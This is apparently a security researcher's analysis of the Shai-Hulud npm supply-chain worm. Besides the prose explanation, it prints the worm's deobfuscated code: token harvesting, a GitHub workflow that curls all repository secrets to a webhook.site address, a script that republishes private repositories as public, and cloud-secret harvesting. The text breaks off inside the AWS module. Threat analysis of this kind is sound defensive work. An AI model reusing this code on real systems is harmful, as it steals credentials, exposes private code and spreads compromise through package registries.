# NPM Supply Chain Attack: Shai-Halud Worm


### Overview 

Since September 8th, many NPM packages have been compromised. This is believed to be related to a phishing email with the title “Mandatory 2FA update,” which created a false sense of urgency by claiming accounts would be "locked" on September 10th if multi-factor authentication (MFA) was not enabled. Clicking the link led users to a fake login page at hxxps://www[.]npmjs[.]help/settings/qix/tfa/manageTfa?action=setup-totp. The domain npmjs.help mimics npm's official npmjs.com domain, and the attackers used it to send messages disguised as support notices.

Here is a summary of the Shai-Hulud worm's capabilities:

- GitHub Module: Gets the GitHub token to enumerate the user's username, email, name, public repositories, followers, following, and organizations. It creates two scripts:
  - processor.sh: Creates a malicious workflow in all repositories to exfiltrate secrets.
  - migrate-repos.sh: Makes all user repositories public.
  - It also creates a repository named "Shai-Hulud" with the description "Shai-Hulud Repository." This repository contains a data.json file that aggregates all information collected by other attack modules for exfiltration.

- TruffleHog Module: Downloads and executes TruffleHog to scan for and discover secrets and credentials.

- AWS Module: Enumerates configuration and credential files within the .aws directory. It then uses these to authenticate, list, and exfiltrate all secrets from AWS Secrets Manager across all major AWS regions available to the compromised user.

- GCP Module: Authenticates and enumerates the GCP Project ID and information. It identifies the service account email in use and lists all available secrets in Google Secret Manager, then exfiltrates them.

- Npm Module: Searches for packages maintained by the username and lists their information. It then updates the package by adding the malicious script to the postinstall script to execute node bundle.js, and publishes a new version of the package.

<img src="/static/NPM/Email.png" alt="drawing" width="1000"/>

### Analysis

#### main()

Let's start our analysis by examining the compromised @crowdstrike/commitlint package. An interesting file within this package is bundle.js, which can be found here: socket.dev/npm/package/@crowdstrike/commitlint/files/8.1.2/bundle.js.

<img src="/static/NPM/image-1.png" alt="drawing" width="1000"/>

Upon inspecting the code, the main() function serves is our entry point and coordinator for the malware's activities.

<img src="/static/NPM/image-2.png" alt="drawing" width="1000"/>

It has 5 core attack modules: GitHubModule, AWSModule, GCPModule, TruffleHogModule and NpmModule. In the following sections, we will delve into the specific capabilities of each module. Another notable aspect of the code is its data exfiltration format.

<img src="/static/NPM/image-42.png" alt="drawing" width="1000"/>

Full code:
```
async function main() {
    // 1. SYSTEM RECONNAISSANCE
    const t = (0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.getSystemInfo)();
    
    // 2. INITIALIZE ATTACK MODULES
    const r_GitHubModule = new GitHubModule();
    const n_AWSModule = new AWSModule();
    const F_GCPModule = new GCPModule();
    const te_TruffleHogModule = new TruffleHogModule();
    
    // 3. NPM TOKEN HARVESTING
    let re_NPM_TOKEN = process.env.NPM_TOKEN;
    re_NPM_TOKEN || (re_NPM_TOKEN = (0,_lib_utils__WEBPACK_IMPORTED_MODULE_1__.parseNpmToken)() ?? void 0);
    const ne_NpmModule = new NpmModule(re_NPM_TOKEN);

    // 4. GITHUB ATTACK CHAIN
    let oe = null, ie = false;
    if (r_GitHubModule.isAuthenticated() && ((0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isLinux)() || (0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isMac)())) {
        const t_CurrentToken = r_GitHubModule.getCurrentToken();
        const n_getUser = await r_GitHubModule.getUser();
        
        if (null != t_CurrentToken && (t_CurrentToken.startsWith("ghp_") || t_CurrentToken.startsWith("gho_")) && n_getUser) {
            await r_GitHubModule.extraction(t_CurrentToken); // Run processor.sh
            
            const F_orgs = await r_GitHubModule.getOrgs();
            for (const t of F_orgs) {
                await r_GitHubModule.migration(n_getUser.login, t, r_GitHubModule.getCurrentToken()); // Run migrate-repos.sh
            }
        }
    }

    // 5. PARALLEL ATTACK VECTORS
    const [se_npm_user, ae_is_valid_token] = await Promise.all([
        // NPM BACKDOOR
        (async () => {
            try {
                oe_npm_user = await ne_NpmModule.validateToken();
                ie_valid_token = !!oe_validateToken;
                
                if (oe_validateToken && ((0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isLinux)() || (0,_utils_os__WEBPACK_IMPORTED_MODULE_0__.isMac)())) {
                    const t_getPackagesByMaintainer = await ne_NpmModule.getPackagesByMaintainer(oe_npm_user, 20);
                    await Promise.all(t_getPackagesByMaintainer.map(async t => {
                        try {
                            await ne_NpmModule.updatePackage(t_getPackagesByMaintainer) // Backdoor packages
                        } catch (t) {}
                    }));
                }
            } catch (t) {}
            return { npmUsername: oe_npm_user, npmTokenValid: ie_is_valid_token };
        })(),
        
        // TRUFFLEHOG SECRET SCANNING
        (async () => {
            if (process.env.SKIP_TRUFFLE) return { available: false, installed: false, version: null, platform: null, results: null };
            
            const [t_isAvailable, r_getVersion] = await Promise.all([
                te_TruffleHogModule.isAvailable(),
                te_TruffleHogModule.getVersion()
            ]);
            
            let n = null;
            t_isAvailable && (n_secrets = await te_TruffleHogModule.scanFilesystem()); // Scan for secrets
            
            return {
                available: t_isAvailable,
                installed: te_TruffleHogModule.isInstalled(),
                version: r_getVersion,
                platform: te_TruffleHogModule.getSupportedPlatform(),
                results: n_secrets
            };
        })()
    ]);

    // 6. CLOUD SECRET HARVESTING
    oe_npmUsername = se_npm_user.npmUsername;
    ie_authenticated = ae_is_valid_token.npmTokenValid;
    
    let ce_AWS_SECRETS = [];
    await n_AWSModule.isValid() && (ce_AWS_SECRETS = await n_AWSModule.getAllSecretValues()); // AWS secrets
    
    let le_GCP_SECRETS = [];
    await F_GCPModule.isValid() && (le_GCP_SECRETS = await F_GCPModule.getAllSecretValues()); // GCP secrets

    // 7. DATA AGGREGATION AND EXFILTRATION
    const ue_exfiltration_data = {
        system: {
            platform: t.platform,
            architecture: t.architecture,
            platformDetailed: t.platformRaw,
            architectureDetailed: t.archRaw
        },
        environment: process.env, // All environment variables
        modules: {
            github: {
                authenticated: r_GitHubModule.isAuthenticated(),
                token: r_GitHubModule.getCurrentToken(),
                username: r_GitHubModule.getUser()
            },
            aws: { secrets: ce_AWS_SECRETS },
            gcp: { secrets: le_GCP_SECRETS },
            truffleHog: ae_result,
            npm: {
                token: re_NPM_TOKEN,
                authenticated: ie_authenticated,
                username: oe_npmUsername
            }
        }
    };

    // 8. CREATE MALICIOUS REPOSITORY
    r_GitHubModule.isAuthenticated() && await r_GitHubModule.makeRepo("Shai-Hulud", JSON.stringify(ue_exfiltration_data, null, 2));
    
    process.exit(0);
}

main().catch(t => {
    process.exit(0);
});
```

##### GitHubModule

<img src="/static/NPM/image-35.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-39.png" alt="drawing" width="1000"/>

Let's begin with the GitHubModule. The module's main() function first calls isAuthenticated(), which attempts to verify the presence of a valid GitHub token. This function tries to retrieve the token from the GITHUB_TOKEN environment variable. If returns nothing, it falls back to executing the command gh auth token to obtain the token. The getCurrentToken() function simply returns the token.

<img src="/static/NPM/image-31.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-32.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-33.png" alt="drawing" width="1000"/>

The get getUser function is responsible for collect the username, email, name, public repositories, followers, following and account creation date of the github account:

<img src="/static/NPM/image-34.png" alt="drawing" width="1000"/>

A particularly notable behavior involves the extraction() and migration() functions. These are responsible for creating and executing the malicious scripts processor.sh and migrate-repos.sh, respectively. The specific details and capabilities of each script will be covered in the next section.

<img src="/static/NPM/image-36.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-37.png" alt="drawing" width="1000"/>

The getOrgs() function enumerates all organizations the user belongs to.

<img src="/static/NPM/image-38.png" alt="drawing" width="1000"/>

The makeRepo is very interesting, it creates a new public repository named Shai-Hulud with the description 'Shai-Hulud Repository'. This repository contains a single file, data.json, which holds a Base64-encoded data.

<img src="/static/NPM/image-41.png" alt="drawing" width="1000"/>

The last behavior can already be seen on github on some users repositorys:

<img src="/static/NPM/data.png" alt="drawing" width="1000"/>


Full code:
```
class GitHubModule {
    constructor() {
        this.token = this.getToken();
        this.octokit = new F.Octokit({ auth: this.token || void 0 });
    }

    // Token harvesting from multiple sources
    getToken() {
        const t = process.env.GITHUB_TOKEN;
        if (t) return t;
        
        try {
            // Steal from GitHub CLI
            const t = (0, te.execSync)("gh auth token", { 
                encoding: "utf8", 
                stdio: "pipe" 
            }).trim();
            if (t) return t;
        } catch {}
        
        return null;
    }
    // User reconnaissance
    async getUser(t) {
        try {
            const r = (t ? await this.octokit.rest.users.getByUsername({ username: t }) 
                         : await this.octokit.rest.users.getAuthenticated()).data;
            return {
                login: r.login,
                name: r.name,
                email: r.email,
                publicRepos: r.public_repos,
                followers: r.followers,
                following: r.following,
                createdAt: r.created_at
            };
        } catch {
            return null;
        }
    }
    async extraction(t) {
        try {
            const r = await Promise.resolve().then(n.t.bind(n, 79896, 23)), // fs module
                  { spawn: F } = await Promise.resolve().then(n.t.bind(n, 35317, 23)), // child_process
                  te = "/tmp/processor.sh",
                  re = { ...process.env },
                  oe = [t];

            r.writeFileSync(te, ne, { mode: 493 }); // 493 = 755 permissions
            F(te, oe, { env: re, detached: true, stdio: "ignore" }).unref();
        } catch (t) {}
    }
    async migration(t, r, F) {
        const te = await Promise.resolve().then(n.t.bind(n, 79896, 23)),
              { spawn: ne } = await Promise.resolve().then(n.t.bind(n, 35317, 23));

        try {
            const n = "/tmp/migrate-repos.sh";
            te.writeFileSync(n, re, { mode: 493 });
            const oe = "/tmp/github-migration";
            te.mkdirSync(oe);
            const ie = { ...process.env },
                  se = ne(n, [r, t, F], { env: ie, detached: true, stdio: "ignore" });

            return se.unref(), {
                success: true,
                message: "Migration started in background",
                pid: se.pid,
                tempScript: n,
                tempDir: oe
            };
        } catch (t) {
            return {
                success: false,
                error: t instanceof Error ? t.message : "Unknown error occurred",
                message: "Migration failed to start"
            };
        }
    }

  async makeRepo(repoName, data) {
    try {
      const response = (await this.octokit.rest.repos.createForAuthenticatedUser({
        name: repoName,
        description: 'Shai-Hulud Repository.',
        private: false,
        auto_init: false,
        has_issues: false,
        has_projects: false,
        has_wiki: false
      })).data;

      // wait-ish (original had a 3s setTimeout)
      await new Promise(resolve => setTimeout(resolve, 3000));

      if (data) {
        const Base64 = Buffer.from(Buffer.from(Buffer.from(data).toString('base64')).toString('base64'));

        await this.octokit.rest.repos.createOrUpdateFileContents({
          owner: response.owner.login,
          repo: response.name,
          path: 'data.json',
          message: 'Initial commit',
          content: Base64
        });
      }

      return {
        owner: response.owner.login,
        repo: response.name,
        url: response.html_url,
        description: response.description,
        stars: response.stargazers_count,
        forks: response.forks_count,
        language: response.language,
        createdAt: response.created_at,
        updatedAt: response.updated_at
      };
    } catch (err) {
      return null;
    }
  }

  isAuthenticated() {
    return !!this.token;
  }

  getCurrentToken() {
    return this.token;
  }

  async getOrgs() {
    try {
      const resp = await this.octokit.rest.orgs.listForAuthenticatedUser({ per_page: 100 });
      return resp.data.map(org => org.login);
    } catch (err) {
      return [];
    }
  }
}

module.exports = { GitHubModule };
```

###### processor.sh

First, the processor.sh script defines several variables and, most importantly, creates a malicious workflow designed to exfiltrate all repository secrets to the URL:
https[://]webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7

<img src="/static/NPM/image-3.png" alt="drawing" width="1000"/>

It then proceeds to check the scope of the user's access and enumerate all available repositories:

<img src="/static/NPM/image-5.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-4.png" alt="drawing" width="1000"/>

And it creates a new branch and commits the malicious workflow file to the repositories:

<img src="/static/NPM/image-6.png" alt="drawing" width="1000"/>

Also a behavior that can be seen in some users repositories

<img src="/static/NPM/work.png" alt="drawing" width="1000"/>

Full code:
```
#!/bin/bash

# Check if PAT is provided
if [ $# -eq 0 ]; then
    echo "Error: GitHub Personal Access Token required as first argument"
    echo "Usage: $0 <GITHUB_PAT>"
    exit 1
fi

GITHUB_TOKEN="$1"
API_BASE="https://api.github.com"
BRANCH_NAME="shai-hulud"
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

FILE_CONTENT=$(cat <<'EOF'
on:
  push:
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
    - name: Data Processing
      run: curl -d "$CONTENTS" https[://]webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7; echo "$CONTENTS" | base64 -w 0 | base64 -w 0
      env:
        CONTENTS: ${{ toJSON(secrets) }}
EOF
)

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# GitHub API helper
github_api() {
    local method="$1"
    local endpoint="$2"
    local data="$3"

    if [ -z "$data" ]; then
        curl -s -X "$method" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Authorization: token $GITHUB_TOKEN" \
            "$API_BASE$endpoint"
    else
        curl -s -X "$method" \
            -H "Accept: application/vnd.github.v3+json" \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Content-Type: application/json" \
            -d "$data" \
            "$API_BASE$endpoint"
    fi
}

echo "🔍 Checking authenticated user and token scopes..."

# Get authenticated user and check scopes
AUTH_RESPONSE=$(curl -s -I -H "Authorization: token $GITHUB_TOKEN" "$API_BASE/user")
SCOPES=$(echo "$AUTH_RESPONSE" | grep -i "x-oauth-scopes:" | cut -d' ' -f2- | tr -d '\r')
USER_RESPONSE=$(github_api GET "/user")
USERNAME=$(echo "$USER_RESPONSE" | jq -r '.login // empty')

if [ -z "$USERNAME" ]; then
    echo -e "${RED}❌ Authentication failed. Please check your token.${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Authenticated as: $USERNAME${NC}"
echo "Token scopes: $SCOPES"

# Check for required scopes
if [[ ! "$SCOPES" =~ "repo" ]]; then
    echo -e "${RED}❌ Error: Token missing 'repo' scope${NC}"
    exit 1
fi

if [[ ! "$SCOPES" =~ "workflow" ]]; then
    echo -e "${RED}❌ Error: Token missing 'workflow' scope${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Required scopes (repo, workflow) verified${NC}"
echo ""

# Fetch repositories and attempt to create branch + add workflow file to each repo
echo "📋 Fetching repositories (updated since 2025)..."
REPOS_RESPONSE=$(github_api GET "/user/repos?affiliation=owner,collaborator,organization_member&since=2025-01-01T00:00:00Z&per_page=100")

REPO_COUNT=$(echo "$REPOS_RESPONSE" | jq '. | length')

if [ "$REPO_COUNT" -eq 0 ]; then
    echo -e "${YELLOW}No repositories found matching the criteria${NC}"
    exit 0
fi

echo -e "${GREEN}Found $REPO_COUNT repositories${NC}"
echo ""

echo "$REPOS_RESPONSE" | jq -c '.[]' | while IFS= read -r repo; do
    REPO_NAME=$(echo "$repo" | jq -r '.name')
    REPO_OWNER=$(echo "$repo" | jq -r '.owner.login')
    REPO_FULL_NAME=$(echo "$repo" | jq -r '.full_name')
    DEFAULT_BRANCH=$(echo "$repo" | jq -r '.default_branch // "main"')

    echo "📦 Processing repository: $REPO_FULL_NAME"

    # Get the latest commit SHA from the default branch
    echo "  → Getting default branch SHA..."
    REF_RESPONSE=$(github_api GET "/repos/$REPO_FULL_NAME/git/ref/heads/$DEFAULT_BRANCH")
    BASE_SHA=$(echo "$REF_RESPONSE" | jq -r '.object.sha // empty')

    if [ -z "$BASE_SHA" ]; then
        echo -e "  ${RED}❌ Could not get default branch SHA. Skipping...${NC}"
        continue
    fi

    # Create new branch
    echo "  → Creating branch: $BRANCH_NAME"
    BRANCH_DATA=$(jq -n \
        --arg ref "refs/heads/$BRANCH_NAME" \
        --arg sha "$BASE_SHA" \
        '{ref: $ref, sha: $sha}'
    )

    BRANCH_RESPONSE=$(github_api POST "/repos/$REPO_FULL_NAME/git/refs" "$BRANCH_DATA")
    BRANCH_ERROR=$(echo "$BRANCH_RESPONSE" | jq -r '.message // empty')

    if [ -n "$BRANCH_ERROR" ] && [[ "$BRANCH_ERROR" != "null" ]]; then
        if [[ "$BRANCH_ERROR" == *"Reference already exists"* ]]; then
            echo -e "  ${YELLOW}⚠ Branch already exists. Continuing with file upload...${NC}"
        else
            echo -e "  ${RED}❌ Failed to create branch: $BRANCH_ERROR${NC}"
            continue
        fi
    else
        echo -e "  ${GREEN}✓ Branch created successfully${NC}"
    fi

    # Encode file and upload to the new branch
    FILE_CONTENT_BASE64=$(echo -n "$FILE_CONTENT" | base64 | tr -d '\n')

    echo "  → Uploading $FILE_NAME to branch..."
    FILE_DATA=$(jq -n \
        --arg message "Add $FILE_NAME placeholder file" \
        --arg content "$FILE_CONTENT_BASE64" \
        --arg branch "$BRANCH_NAME" \
        '{message: $message, content: $content, branch: $branch}'
    )

    FILE_RESPONSE=$(github_api PUT "/repos/$REPO_FULL_NAME/contents/$FILE_NAME" "$FILE_DATA")
    FILE_ERROR=$(echo "$FILE_RESPONSE" | jq -r '.message // empty')

    if [ -n "$FILE_ERROR" ] && [[ "$FILE_ERROR" != "null" ]]; then
        if [[ "$FILE_ERROR" == *"already exists"* ]]; then
            echo -e "  ${YELLOW}⚠ File already exists on branch${NC}"
        else
            echo -e "  ${RED}❌ Failed to upload file: $FILE_ERROR${NC}"
        fi
    else
        echo -e "  ${GREEN}✓ File uploaded successfully${NC}"
    fi

    echo ""
done

echo -e "${GREEN}🎉 Script execution completed!${NC}"
```

###### migrate-repos.sh

The migrate-repos.sh script begins by enumerating the user's internal and private repositories.

<img src="/static/NPM/image-7.png" alt="drawing" width="1000"/>

It then processes each repository, appending the suffix -migration to its original name. It creates a new public repository with this new name and the description "Shai-Hulud Migration".

<img src="/static/NPM/image-8.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-13.png" alt="drawing" width="1000"/>

The core function, migrate_repo, performs the following actions to duplicate each repository:
- It uses git clone --mirror to create a full copy of the repository.
- It changes the remote URL to point to the newly created target repository using the command git remote set-url origin.
- It pushes all content to the new mirror with git push --mirror.
- Finally, it cleans up by removing the temporary local directory with rm -rf "$repo_dir/$migration_name".

<img src="/static/NPM/image-12.png" alt="drawing" width="1000"/>

To make the repository public it only changes the field private to "false"

<img src="/static/NPM/image-11.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-10.png" alt="drawing" width="1000"/>

This behavior can be seen in some users repositories:

<img src="/static/NPM/work.png" alt="drawing" width="1000"/>

Full code:
```
#!/bin/bash

SOURCE_ORG=""
TARGET_USER=""
GITHUB_TOKEN=""
PER_PAGE=100
TEMP_DIR=""

if [[ $# -lt 3 ]]; then
    exit 1
fi

SOURCE_ORG="$1"
TARGET_USER="$2"
GITHUB_TOKEN="$3"

if [[ -z "$SOURCE_ORG" || -z "$TARGET_USER" || -z "$GITHUB_TOKEN" ]]; then
    echo "All three arguments are required"
    exit 1
fi

TEMP_DIR="./temp$TARGET_USER"
mkdir -p "$TEMP_DIR"
TEMP_DIR=$(realpath "$TEMP_DIR")

github_api() {
    local endpoint="$1"
    local method="${2:-GET}"
    local data="${3:-}"
    
    local curl_args=("-s" "-w" "%{http_code}" "-H" "Authorization: token $GITHUB_TOKEN" "-H" "Accept: application/vnd.github.v3+json")
    
    if [[ "$method" != "GET" ]]; then
        curl_args+=("-X" "$method")
    fi
    
    if [[ -n "$data" ]]; then
        curl_args+=("-H" "Content-Type: application/json" "-d" "$data")
    fi
    
    curl "${curl_args[@]}" "https://api.github.com$endpoint"
}

get_all_repos() {
    local org="$1"
    local page=1
    local all_slugs="[]"

    while true; do
        local response
        response=$(github_api "/orgs/$org/repos?type=private,internal&per_page=$PER_PAGE&page=$page")

        local http_code="${response: -3}"
        local body="${response%???}"

        if ! echo "$body" | jq empty 2>/dev/null; then
            return 1
        fi

        if ! echo "$body" | jq -e 'type == "array"' >/dev/null; then
            return 1
        fi

        local repos_count
        repos_count=$(echo "$body" | jq length)

        if [[ "$repos_count" -eq 0 ]]; then
            break
        fi

        local page_slugs
        page_slugs=$(echo "$body" | jq '[.[] | select(.archived == false) | .full_name]')

        all_slugs=$(echo "$all_slugs" "$page_slugs" | jq -s 'add')

        ((page++))
    done

    echo "$all_slugs"
}

create_repo() {
    local repo_name="$1"
    local repo_data
    repo_data=$(cat <<EOF
{
    "name": "$repo_name",
    "description": "Shai-Hulud Migration",
    "private": true,
    "has_issues": false,
    "has_projects": false,
    "has_wiki": false
}
EOF
    )
    
    local response
    response=$(github_api "/user/repos" "POST" "$repo_data")
    
    local http_code="${response: -3}"
    local body="${response%???}"
    
    if echo "$body" | jq -e '.name' >/dev/null 2>&1; then
        return 0
    else
        if [[ "$http_code" =~ ^4[0-9][0-9]$ ]] && echo "$body" | grep -qi "secondary rate"; then
            sleep 600
            
            # Retry the request
            response=$(github_api "/user/repos" "POST" "$repo_data")
            http_code="${response: -3}"
            body="${response%???}"
            
            if echo "$body" | jq -e '.name' >/dev/null 2>&1; then
                return 0
            fi
        fi
        return 1
    fi
}

make_repo_public() {
    local repo_name="$1"
    local repo_data
    repo_data=$(cat <<EOF
{
    "private": false
}
EOF
    )

    local response
    response=$(github_api "/repos/$TARGET_USER/$repo_name" "PATCH" "$repo_data")

    local http_code="${response: -3}"
    local body="${response%???}"

    if echo "$body" | jq -e '.private == false' >/dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

migrate_repo() {
    local source_clone_url="$1"
    local target_clone_url="$2"
    local migration_name="$3"
    local repo_dir="$TEMP_DIR"

    if ! git clone --mirror "$source_clone_url" "$repo_dir/$migration_name" 2>/dev/null; then
        return 1
    fi

    cd "$repo_dir/$migration_name"
    if ! git remote set-url origin "$target_clone_url" 2>/dev/null; then
        cd - >/dev/null
        return 1
    fi

    if ! git push --mirror 2>/dev/null; then
        cd - >/dev/null
        return 1
    fi

    cd - >/dev/null

    rm -rf "$repo_dir/$migration_name"

    return 0
}

process_repositories() {
    local repos="$1"
    local total_repos
    total_repos=$(echo "$repos" | jq length)
    
    if [[ "$total_repos" -eq 0 ]]; then
        return 0
    fi
    local success_count=0
    local failure_count=0
    
    for i in $(seq 0 $((total_repos - 1))); do
        local repo
        repo=$(echo "$repos" | jq -r ".[$i]")
        
        local migration_name="${repo//\//-}-migration"
        
        local auth_source_url="https://$GITHUB_TOKEN@github.com/$repo.git"
        local auth_target_url="https://$GITHUB_TOKEN@github.com/$TARGET_USER/$migration_name.git"
        # Create target repository
        if create_repo "$migration_name"; then
            # Migrate the repository
            if migrate_repo "$auth_source_url" "$auth_target_url" "$migration_name"; then
                # Make the repository public after successful migration
                if make_repo_public "$migration_name"; then
                    ((success_count++))
                else
                    ((success_count++))
                fi
            else
                ((failure_count++))
            fi
        else
            ((failure_count++))
        fi
    done
    
    return $failure_count
}

main() {
    for tool in curl jq git; do
        if ! command -v "$tool" &> /dev/null; then
            exit 1
        fi
    done
    
    local repos
    if ! repos=$(get_all_repos "$SOURCE_ORG"); then
        exit 1
    fi

    # Process all repositories
    process_repositories "$repos"
}

# Run main function
main "$@"

```

##### TruffleHogModule

<img src="/static/NPM/image-43.png" alt="drawing" width="1000"/>

The TruffleHogModule is relatively straightforward. Its primary function, scanFilesystem, executes the TruffleHog tool to scan for secrets and returns the results. The module's other functions handle downloading, extracting, and installing the TruffleHog tool.

<img src="/static/NPM/image-15.png" alt="drawing" width="1000"/>

Full code:
```

class TruffleHogModule {
    constructor() {
        this.installedStatus = false;
        this.systemInfo = getSystemInfo();
        const binaryName = "windows" === this.systemInfo.platform ? "trufflehog.exe" : "trufflehog";
        this.binaryPath = path.join(process.cwd(), binaryName);
        this.checkIfInstalled();
    }

    checkIfInstalled() {
        this.installedStatus = fs.existsSync(this.binaryPath);
    }

    mapArchitecture(arch) {
        switch(arch) {
            case "x64":
            default:
                return "amd64";
            case "arm64":
                return "arm64";
            case "arm":
                return "arm";
            case "x86":
                return "386";
        }
    }

    mapPlatform(platform) {
        switch(platform) {
            case "windows":
                return "windows";
            case "linux":
            default:
                return "linux";
            case "mac":
                return "darwin";
        }
    }

    async getLatestRelease() {
        try {
            const response = await fetch("https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest");
            if (!response.ok) throw new Error(`GitHub API request failed: ${response.statusText}`);
            
            const tagName = (await response.json()).tag_name;
            const version = tagName.replace("v", "");
            const platform = this.mapPlatform(this.systemInfo.platform);
            const fileName = `trufflehog_${version}_${platform}_${this.mapArchitecture(this.systemInfo.architecture)}.tar.gz`;
            
            return {
                version: version,
                downloadUrl: `https://github.com/trufflesecurity/trufflehog/releases/download/${tagName}/${fileName}`,
                fileName: fileName
            };
        } catch (error) {
            throw new Error(`Failed to get latest release: ${error}`);
        }
    }

    async downloadFile(url, destination) {
        try {
            const response = await fetch(url);
            if (!response.ok) throw new Error(`Download failed: ${response.statusText}`);
            if (!response.body) throw new Error("No response body");
            
            const writer = fs.createWriteStream(destination);
            await pipeline(response.body, writer);
        } catch (error) {
            throw new Error(`Failed to download file: ${error}`);
        }
    }

    async extractBinary(archivePath) {
        try {
            const binaryName = "windows" === this.systemInfo.platform ? "trufflehog.exe" : "trufflehog";
            const extractCommand = `tar -xzf "${archivePath}" -C "${process.cwd()}" ${binaryName}`;
            
            execSync(extractCommand, {stdio: "pipe"});
            
            if ("windows" !== this.systemInfo.platform) {
                execSync(`chmod +x "${this.binaryPath}"`, {stdio: "pipe"});
            }
            
            const cleanupCommand = "windows" === this.systemInfo.platform ? `del "${archivePath}"` : `rm "${archivePath}"`;
            execSync(cleanupCommand, {stdio: "pipe"});
            
            this.installedStatus = true;
        } catch (error) {
            throw new Error(`Failed to extract binary: ${error}`);
        }
    }

    async install() {
        try {
            if (this.installedStatus) return true;
            
            const release = await this.getLatestRelease();
            const archivePath = path.join(process.cwd(), release.fileName);
            
            await this.downloadFile(release.downloadUrl, archivePath);
            await this.extractBinary(archivePath);
            
            return true;
        } catch (error) {
            console.error("TruffleHog installation failed:", error);
            return false;
        }
    }

    async getVersion() {
        try {
            if (!this.installedStatus) return null;
            return execSync(`"${this.binaryPath}" --version`, {encoding: "utf8", stdio: "pipe"}).trim();
        } catch {
            return null;
        }
    }

    async isAvailable() {
        return !!this.installedStatus || await this.install();
    }

    getBinaryPath() {
        return this.binaryPath;
    }

    isInstalled() {
        return this.installedStatus;
    }

    getSupportedPlatform() {
        return {
            platform: this.mapPlatform(this.systemInfo.platform),
            architecture: this.mapArchitecture(this.systemInfo.architecture)
        };
    }

    async scanFilesystem(path = ".", timeout = 90000) {
        return new Promise((resolve) => {
            const startTime = Date.now();
            let stdout = "";
            let stderr = "";
            let timedOut = false;
            let resolved = false;
            
            const safeResolve = (result) => {
                if (!resolved) {
                    resolved = true;
                    resolve(result);
                }
            };

            if (!this.installedStatus || !fs.existsSync(this.binaryPath)) {
                return safeResolve({
                    success: false,
                    error: "TruffleHog binary not available",
                    executionTime: Date.now() - startTime
                });
            }

            const args = ["filesystem", path, "--json", "--results=verified"];
            
            try {
                const process = spawn(this.binaryPath, args, {
                    cwd: homedir(),
                    env: process.env,
                    stdio: ["pipe", "pipe", "pipe"]
                });

                const timeoutId = setTimeout(() => {
                    timedOut = true;
                    process.kill("SIGTERM");
                    setTimeout(() => {
                        if (!process.killed) process.kill("SIGKILL");
                        safeResolve({
                            success: false,
                            output: stdout.trim() || undefined,
                            error: `Process terminated after ${timeout}ms timeout`,
                            executionTime: Date.now() - startTime
                        });
                    }, 2000);
                }, timeout);

                process.stdout?.on("data", (data) => {
                    stdout += data.toString();
                });

                process.stderr?.on("data", (data) => {
                    stderr += data.toString();
                });

                process.on("close", (code) => {
                    clearTimeout(timeoutId);
                    const executionTime = Date.now() - startTime;
                    
                    try {
                        if (fs.existsSync(this.binaryPath)) {
                            fs.unlinkSync(this.binaryPath);
                            this.installedStatus = false;
                        }
                    } catch (error) {}
                    
                    if (!timedOut) {
                        safeResolve({
                            success: code === 0,
                            output: stdout.trim() || undefined,
                            error: code !== 0 ? stderr || `Process exited with code ${code}` : undefined,
                            executionTime: executionTime
                        });
                    }
                });

                process.on("error", (error) => {
                    clearTimeout(timeoutId);
                    const executionTime = Date.now() - startTime;
                    
                    try {
                        if (fs.existsSync(this.binaryPath)) {
                            fs.unlinkSync(this.binaryPath);
                            this.installedStatus = false;
                        }
                    } catch (error) {}
                    
                    safeResolve({
                        success: false,
                        error: `Failed to start process: ${error.message}`,
                        executionTime: executionTime
                    });
                });
            } catch (error) {
                safeResolve({
                    success: false,
                    error: `Failed to spawn process: ${error}`,
                    executionTime: Date.now() - startTime
                });
            }
        });
    }
}
```

##### AWSModule

The AWSModule contains an interesting variable that defines a specific set of AWS regions to be used during its execution:
<img src="/static/NPM/image-17.png" alt="drawing" width="1000"/>

The principal functions called from its main() method are isValid() and getAllSecretValues().

<img src="/static/NPM/image-18.png" alt="drawing" width="1000"/>

The initialize() and parseAwsProfiles() functions begin the enumeration and access process. They locate the .aws/credentials and .aws/config files and proceed to extract the profiles configured within them.

<img src="/static/NPM/image-19.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-16.png" alt="drawing" width="1000"/>

The getAllSecretValues() function starts by enumerating secrets. It creates a Secrets Manager client for each predefined region using the getSecretsClient() helper function and lists all available secrets using the ListSecretsCommand.

<img src="/static/NPM/image-20.png" alt="drawing" width="1000"/>

<img src="/static/NPM/image-21.png" alt="drawing" width="1000"/>

Then proceeds to retrieve the value of each secret using the GetSecretValueCommand.

<img src="/static/NPM/image-22.png" alt="drawing" width="1000"/>

Full code:
```
class AWSModule {
  constructor() {
    this.stsClient = null;
    this.secretsClients = new Map();
    this.callerIdentity = null;
    this.profile = null;
    this.REGIONS = [
      "us-east-1", "us-east-2", "us-west-1", "us-west-2",
      "eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1", "eu-north-1",
      "ap-southeast-1", "ap-southeast-2", "ap-northeast-1", "ap-northeast-2", "ap-south-1"
    ];
  }

  parseAwsProfiles() {
    const profiles = [];
    const configPaths = [
      join(homedir(), ".aws", "credentials"),
      join(homedir(), ".aws", "config")
    ];

    for (const configPath of configPaths) {
      if (existsSync(configPath)) {
        try {
          const content = readFileSync(configPath, "utf-8");
          const profileMatches = content.match(/\[(?:profile )?([^\]]+)\]/g);
          
          if (profileMatches) {
            for (const match of profileMatches) {
